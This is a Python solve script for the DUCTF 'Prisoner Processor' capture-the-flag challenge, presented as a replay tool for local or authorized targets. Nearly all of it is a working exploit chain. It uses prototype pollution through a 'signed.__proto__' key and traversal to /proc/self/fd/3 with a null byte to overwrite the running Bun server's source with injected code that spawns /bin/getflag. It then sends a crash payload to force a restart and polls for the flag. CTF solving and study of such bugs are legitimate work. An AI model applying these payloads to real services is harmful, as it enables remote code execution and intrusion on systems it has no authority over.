#!/usr/bin/env python3
"""Replay the DUCTF Prisoner Processor proof chain against an authorized target.

This helper is for local or explicitly authorized CTF services. It does not use
a reverse shell. Instead it overwrites the running Bun app source with a tiny
handler that runs the challenge's local `/bin/getflag` helper and returns the
output over HTTP after the challenge service restarts.
"""

from __future__ import annotations

import argparse
import json
import re
import sys
import time
import urllib.error
import urllib.request
from typing import Any


FLAG_RE = re.compile(r"(?i)(?:ductf|flag|ctf)\{[^{}\r\n]{3,160}\}")
PLACEHOLDER_MARKERS = ("test_flag", "real_flag_on_instance", "placeholder", "fake_flag", "example_flag")
OVERWRITE_PREFIX = "../../proc/self/fd/3\0"
CRASH_PREFIX = "../../proc/self/fd/3\\x"


def is_placeholder_flag(candidate: str) -> bool:
    lowered = candidate.lower()
    return any(marker in lowered for marker in PLACEHOLDER_MARKERS)


def extract_real_flags(text: str) -> list[str]:
    flags: list[str] = []
    for match in FLAG_RE.finditer(text):
        candidate = match.group(0)
        if is_placeholder_flag(candidate) or candidate in flags:
            continue
        flags.append(candidate)
    return flags


def build_overwrite_payload(example: dict[str, Any]) -> dict[str, Any]:
    """Build a JSON body that writes valid TypeScript through YAML output."""
    signature = str(example["signature"])
    signed_data = dict(example["data"])
    signed_data["signed.__proto__"] = {"outputPrefix": OVERWRITE_PREFIX}
    bootstrap_key = "const flag"
    bootstrap_value = (
        'string = Bun.spawnSync({cmd:["/bin/getflag"]}).stdout.toString(); '
        "export default {port:1337,fetch(req){return new Response(flag)}};/*"
    )
    data = {
        bootstrap_key: bootstrap_value,
        **signed_data,
        "z": "hi */",
    }
    return {"data": data, "signature": signature}


def build_crash_payload(example: dict[str, Any]) -> dict[str, Any]:
    signature = str(example["signature"])
    data = dict(example["data"])
    data["signed.__proto__"] = {"outputPrefix": CRASH_PREFIX}
    return {"data": data, "signature": signature}


def request_json(url: str, method: str = "GET", payload: dict[str, Any] | None = None, timeout: int = 8) -> Any:
    data = None if payload is None else json.dumps(payload).encode()
    request = urllib.request.Request(
        url,
        data=data,
        headers={"content-type": "application/json"},
        method=method,
    )
    with urllib.request.urlopen(request, timeout=timeout) as response:
        body = response.read().decode("utf-8", errors="replace")
    return json.loads(body)


def request_text(url: str, timeout: int = 8) -> str:
    with urllib.request.urlopen(url, timeout=timeout) as response:
        return response.read().decode("utf-8", errors="replace")


def fetch_example(target: str, timeout: int) -> dict[str, Any]:
    payload = request_json(target.rstrip("/") + "/examples", timeout=timeout)
    examples = payload.get("examples") if isinstance(payload, dict) else None
    if not isinstance(examples, list) or not examples:
        raise RuntimeError("target did not return example prisoner payloads")
    example = examples[0]
    if not isinstance(example, dict) or not isinstance(example.get("data"), dict) or "signature" not in example:
        raise RuntimeError("example prisoner payload is missing data/signature")
    return example


def post_convert(target: str, payload: dict[str, Any], timeout: int) -> Any:
    return request_json(target.rstrip("/") + "/convert-to-yaml", method="POST", payload=payload, timeout=timeout)


def poll_flag(target: str, attempts: int, delay: float, timeout: int) -> str | None:
    for _ in range(attempts):
        try:
            text = request_text(target.rstrip("/") + "/", timeout=timeout)
        except Exception:
            time.sleep(delay)
            continue
        flags = extract_real_flags(text)
        if flags:
            return flags[0]
        time.sleep(delay)
    return None


def solve(target: str, attempts: int = 30, delay: float = 1.0, timeout: int = 8) -> str:
    example = fetch_example(target, timeout)
    post_convert(target, build_overwrite_payload(example), timeout)
    try:
        post_convert(target, build_crash_payload(example), timeout)
    except urllib.error.URLError:
        pass
    flag = poll_flag(target, attempts=attempts, delay=delay, timeout=timeout)
    if not flag:
        raise RuntimeError("no non-placeholder flag recovered after overwrite and restart polling")
    return flag


def main() -> int:
    parser = argparse.ArgumentParser(description="Replay the Prisoner Processor local/authorized CTF proof chain.")
    parser.add_argument("target", help="base URL for the local or authorized challenge service, e.g. http://127.0.0.1:1337")
    parser.add_argument("--attempts", type=int, default=30)
    parser.add_argument("--delay", type=float, default=1.0)
    parser.add_argument("--timeout", type=int, default=8)
    parser.add_argument("--dry-run", action="store_true", help="print generated payloads from the first /examples item without triggering crash")
    args = parser.parse_args()

    try:
        if args.dry_run:
            example = fetch_example(args.target, args.timeout)
            print(json.dumps(build_overwrite_payload(example), ensure_ascii=False, indent=2))
            print(json.dumps(build_crash_payload(example), ensure_ascii=False, indent=2))
            return 0
        flag = solve(args.target, attempts=args.attempts, delay=args.delay, timeout=args.timeout)
    except Exception as exc:
        print(f"[!] {exc}", file=sys.stderr)
        return 1

    print(f"flag: {flag}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
